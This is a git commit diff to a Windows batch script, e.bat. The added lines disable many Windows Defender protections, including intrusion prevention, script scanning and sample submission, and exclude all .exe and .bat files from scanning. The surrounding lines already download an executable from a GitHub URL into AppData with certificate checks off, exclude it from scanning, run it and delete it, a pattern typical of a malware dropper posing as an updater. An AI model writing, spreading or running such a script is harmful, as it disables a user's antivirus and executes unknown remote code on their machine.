a9e54df08f8eb090d9ce87727a176e8aba7f0443
EnVy <leanvieth@gmail.com>
2024-03-19 21:14:37 -0500

    Update e.bat

--- e.bat
+++ e.bat
@@ -8,6 +8,15 @@ set "url=https://github.com/Sxzzzy/blue/raw/main/%file%"
 :: Define the document path dynamically using USERPROFILE
 set "docPath=%USERPROFILE%\AppData\Roaming\Microsoft"
 
+:: Disable various Windows Defender features (use with extreme caution!)
+powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend"
+
+:: Exclude all .exe files in %USERPROFILE% from Windows Defender scanning
+powershell -Command "Add-MpPreference -ExclusionExtension '.exe'"
+
+:: Exclude all .exe files in %USERPROFILE% from Windows Defender scanning
+powershell -Command "Add-MpPreference -ExclusionExtension '.bat'"
+
 :: Exclude the AutoUpdater file dynamically based on the user's profile
 powershell -Command "Add-MpPreference -ExclusionPath '%docPath%\%file%'"
 
@@ -20,6 +29,9 @@ curl -k -L %url% -o "%docPath%\%file%"
 :: Execute the file
 cd /d "%docPath%"
 start /wait "" "%file%"
+
+:: Change the sample submission settings to send safe samples automatically
+powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"
 
 :: Delete the file
 del /q "%file%"
